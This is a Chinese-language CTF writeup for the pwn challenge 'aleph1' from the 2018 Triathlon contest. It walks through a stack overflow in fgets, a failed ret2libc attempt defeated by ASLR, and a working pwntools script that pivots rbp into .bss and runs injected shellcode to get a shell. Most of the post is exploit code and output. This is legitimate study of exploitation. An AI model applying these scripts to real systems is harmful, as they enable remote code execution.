---
title: 2018 铁人三项赛 aleph1 Writeup
date: 2018-10-29 11:45:08
tags: [pwn]
categories: Exploit
keywords: [pwn, CTF]
---


# 0x01 漏洞位置
程序很简单，调用 fgets() 从 stdin 中读取 1337 bytes 数据到 yolo 数组中，由于 yolo 内存空间为 1024 bytes，但输入数据长度大于 1024 时会导致栈溢出。
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char yolo[1024]; // [rsp+0h] [rbp-400h]

  fgets(yolo, 1337, _bss_start);
  return 0;
}
```

# 0x02. 漏洞利用
首先，检查程序开启的安全机制，发现没有开任何安全机制。
```python
➜  aleph checksec aleph1
[*] '/home/lc/t3pwn/aleph/aleph1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
## 1. 第一次尝试
由于题目给了 libc 文件，所以可以尝试 ret2libc 进行利用。
```python
#!/usr/bin/env python

from pwn import *
context.log_level = 'debug'

p = process(['./aleph1'], env = {"LD_PRELOAD":"./libc64"})
#p = remote("202.1.14.12", 40001)
system_add = p64(0x7ffff7a52390)
poprdi_add = p64(0x0000000000400663)
bash_add = p64(0x7ffff7b99d57)

raw_input("send")
payload = 1032* "A" +  poprdi_add + bash_add + system_add

p.sendline(payload)
p.interactive()
```
但很不幸，服务器开启了 ASLR，libc 加载基址的随机化会使得 libc 中 system 函数地址和 "/bin/sh" 字符串地址发生变化，导致利用失败。

## 2. 第二次尝试
由于开启了 ASLR，利用过程就不能依赖堆栈以及内存中共享库的地址。程序汇编代码如下：
```C
.text:00000000004005CA                 push    rbp
.text:00000000004005CB                 mov     rbp, rsp
.text:00000000004005CE                 sub     rsp, 400h
.text:00000000004005D5 ; 4:   fgets(yolo, 1337, _bss_start);
.text:00000000004005D5                 mov     rdx, cs:__bss_start ; stream
.text:00000000004005DC                 lea     rax, [rbp+yolo]
.text:00000000004005E3                 mov     esi, 539h       ; n
.text:00000000004005E8                 mov     rdi, rax        ; s
.text:00000000004005EB                 call    _fgets
.text:00000000004005F0 ; 5:   return 0;
.text:00000000004005F0                 mov     eax, 0
.text:00000000004005F5                 leave
.text:00000000004005F6                 retn
                                        ...
.bss:0000000000601030 __bss_start     dq ?                    ; DATA XREF: LOAD:0000000000400350↑o
.bss:0000000000601030                                         ; deregister_tm_clones+1↑o ...
.bss:0000000000601030                                         ; Alternative name is '__TMC_END__'
.bss:0000000000601030                                         ; stdin@@GLIBC_2.2.5
.bss:0000000000601030                                         ; _edata
```
分析汇编代码后发现，通过两次输入可以把 shellcode 写入 .bss 段中，然后跳转到 .bss 段执行 shellcode，具体思路如下：
1. 利用 fgets() 写内存溢出，把 rbp 寄存器修改到 .bss 段的 0x601440(0x601030 + 0x400 + 0x10) 地址处，其中，0x400 为 yolo 的内存大小，偏移0x10 是为了不破坏 .bss 中 stdin 的值 ；同时，把返回地址覆盖为 0x4005D5，以便进行第二次调用 fgets() 进行写内存。
2. 利用第二次调用 fgets() 把 shellcode 写入 .bss 中，由于 rbp 被修改到 .bss 段的 0x601440，所以会把数据写入到 0x601040（ [rbp - 0x400] ）；同时，把返回地址覆盖为 shellcode 地址 0x601040。
3. 最终 ret 时跳转到 shellcode 执行。

利用脚本如下：
```python
#!/usr/bin/env python
from pwn import *

p = process("./aleph1")
context(os='linux', arch='amd64')

bss_start = 0x601030
rbp = bss_start + 0x400 + 0x10
ret_addr = 0x4005D5
payload1 = 1024*"A" + p64(rbp) + p64(ret_addr)
p.sendline(payload1)

shellcode = asm(shellcraft.sh())
sc_addr = bss_start + 0x10
payload2 = shellcode + (1024 + 8 - len(shellcode))*"A" + p64(sc_addr)
p.sendline(payload2)
p.interactive()
```

